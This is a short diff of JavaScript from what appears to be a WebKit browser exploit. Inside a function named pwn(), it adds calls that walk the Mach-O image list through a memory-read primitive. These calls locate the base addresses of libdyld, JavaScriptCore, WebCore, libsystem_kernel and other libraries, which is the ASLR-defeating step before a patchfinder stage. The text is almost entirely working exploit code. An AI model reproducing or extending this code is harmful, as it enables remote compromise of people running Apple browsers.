@@ -168,7 +168,7 @@ function find_dylib_by_name(macho_base, name) {
         // log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
 
         dylib_name = get_dylib_name(next_dylib);
-        // log(`[*] dylib_name: ${dylib_name}`);
+        // log(`[*] dylib_name: ${dylib_name}`);    //FOR CHECK if it's working
 
         if(dylib_name.includes(name))
             return macho_base;
@@ -367,8 +367,23 @@ function pwn() {
     }
     log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
     
-    var dylib_base = find_dylib_by_name(libcpp1_base, "libc++abi.dylib")
-    log(`[+] dylib_base: ${dylib_base}`);
+    var libdyld_base = find_dylib_by_name(libcpp1_base, "libdyld")
+    log(`[+] libdyld_base: ${libdyld_base}`);
+
+    var jsc_base = find_dylib_by_name(libcpp1_base, "JavaScriptCore")
+    log(`[+] jsc_base: ${jsc_base}`);
+
+    var coreaudio_base = find_dylib_by_name(libcpp1_base, "CoreAudio")
+    log(`[+] coreaudio_base: ${coreaudio_base}`);
+
+    var webcore_base = find_dylib_by_name(libcpp1_base, "WebCore")
+    log(`[+] webcore_base: ${webcore_base}`);
+
+    var libsystem_platform_base = find_dylib_by_name(libcpp1_base, "libsystem_platform")
+    log(`[+] libsystem_platform_base: ${libsystem_platform_base}`);
+
+    var libsystem_kernel_base = find_dylib_by_name(libcpp1_base, "libsystem_kernel")
+    log(`[+] libsystem_kernel_base: ${libsystem_kernel_base}`);
 
 
     // remove this "return" if finished patchfinder
